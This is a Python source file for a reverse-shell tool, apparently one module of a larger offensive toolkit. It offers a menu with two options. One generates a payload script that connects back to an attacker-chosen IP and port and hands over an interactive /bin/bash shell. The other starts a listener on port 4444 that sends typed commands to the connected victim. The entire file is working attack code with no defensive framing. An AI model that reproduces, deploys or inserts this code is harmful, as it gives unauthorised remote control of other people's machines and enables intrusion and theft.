# reverse_shell.py
import socket
import os
import settings
import threading

def generate_payload(attacker_ip, attacker_port, output_file="reverse_shell.py"):
    payload = f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{attacker_ip}',{attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
"""
    with open(output_file, "w") as f:
        f.write(payload)
    
    print(f"{settings.COLOR_GREEN}[✓] Reverse shell payload saved to {output_file}{settings.COLOR_END}")

def start_listener(host="0.0.0.0", port=4444):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"{settings.COLOR_CYAN}[~] Listening on {host}:{port}...{settings.COLOR_END}")

    conn, addr = s.accept()
    print(f"{settings.COLOR_GREEN}[+] Connection from {addr[0]}{settings.COLOR_END}")

    while True:
        command = input(f"{settings.COLOR_YELLOW}Shell> {settings.COLOR_END}")
        if command.strip() == "":
            continue
        conn.send(command.encode() + b"\n")
        response = conn.recv(4096).decode()
        print(response)

def launch_reverse_shell():
    choice = input("\n(1) Generate Payload\n(2) Start Listener\nChoose (1/2): ")

    if choice == "1":
        ip = input("Enter your IP address: ")
        port = int(input("Enter your port (e.g., 4444): "))
        output = input("Output filename (default reverse_shell.py): ") or "reverse_shell.py"
        generate_payload(ip, port, output)
    elif choice == "2":
        host = input("Host (default 0.0.0.0): ") or "0.0.0.0"
        port = int(input("Port (default 4444): ") or "4444")
        start_listener(host, port)
    else:
        print(f"{settings.COLOR_RED}[!] Invalid choice.{settings.COLOR_END}")

if __name__ == "__main__":
    launch_reverse_shell()
